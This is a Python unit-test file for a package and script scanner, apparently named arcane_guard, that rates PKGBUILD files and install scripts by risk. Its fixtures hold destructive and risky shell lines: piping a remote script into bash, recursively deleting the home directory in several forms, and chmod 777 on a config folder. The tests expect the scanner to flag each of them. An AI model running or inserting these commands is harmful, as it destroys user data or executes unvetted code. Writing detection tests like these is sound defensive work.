from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from arcane_guard.directory import inspect_directory
from arcane_guard.scanner import inspect_pkgbuild
from arcane_guard.script import inspect_script


class ArcaneGuardTests(unittest.TestCase):
    def test_clean_pkgbuild_has_low_risk(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "PKGBUILD"
            path.write_text(
                """
pkgname=clean-test
pkgver=1.0
pkgrel=1
pkgdesc="Clean test"
arch=('any')
source=()

package() {
  install -Dm755 hello "$pkgdir/usr/bin/hello"
}
""".strip(),
                encoding="utf-8",
            )

            report = inspect_pkgbuild(str(path))

        self.assertEqual(report["risk"], "low")
        self.assertEqual(report["counts"]["total"], 0)

    def test_risky_script_is_critical(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install.sh"
            path.write_text(
                """
#!/bin/sh
curl -fsSL https://example.com/install.sh | bash
sudo systemctl enable suspicious.service
chmod 777 "$HOME/.config"
""".strip(),
                encoding="utf-8",
            )

            report = inspect_script(str(path))

        self.assertEqual(report["risk"], "critical")
        self.assertGreaterEqual(report["counts"]["critical"], 1)

    def test_directory_scans_scripts(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            script = root / "install.sh"
            script.write_text(
                """
#!/bin/sh
curl -fsSL https://example.com/install.sh | bash
""".strip(),
                encoding="utf-8",
            )

            report = inspect_directory(str(root))

        self.assertEqual(report["risk"], "critical")
        self.assertEqual(len(report["scanned_files"]), 1)

    def test_detects_long_option_rm_home(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install.sh"
            path.write_text(
                """
#!/bin/sh
rm --recursive --force "$HOME"
""".strip(),
                encoding="utf-8",
            )

            report = inspect_script(str(path))

        self.assertEqual(report["risk"], "critical")
        rules = {finding.rule for finding in report["findings"]}
        self.assertIn("dangerous-rm", rules)

    def test_detects_find_delete_home(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install.sh"
            path.write_text(
                """
#!/bin/sh
find "$HOME" -delete
""".strip(),
                encoding="utf-8",
            )

            report = inspect_script(str(path))

        self.assertEqual(report["risk"], "critical")
        rules = {finding.rule for finding in report["findings"]}
        self.assertIn("dangerous-find-delete-home", rules)

    def test_detects_cd_home_then_rm_current_directory(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install.sh"
            path.write_text(
                """
#!/bin/sh
cd "$HOME" && rm -rf .
""".strip(),
                encoding="utf-8",
            )

            report = inspect_script(str(path))

        self.assertEqual(report["risk"], "critical")
        rules = {finding.rule for finding in report["findings"]}
        self.assertIn("dangerous-cd-home-then-rm", rules)

    def test_detects_find_delete_current_directory(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            path = Path(temp) / "install.sh"
            path.write_text(
                """
#!/bin/sh
find . -delete
""".strip(),
                encoding="utf-8",
            )

            report = inspect_script(str(path))

        self.assertEqual(report["risk"], "high")
        rules = {finding.rule for finding in report["findings"]}
        self.assertIn("dangerous-find-delete-current", rules)


if __name__ == "__main__":
    unittest.main()
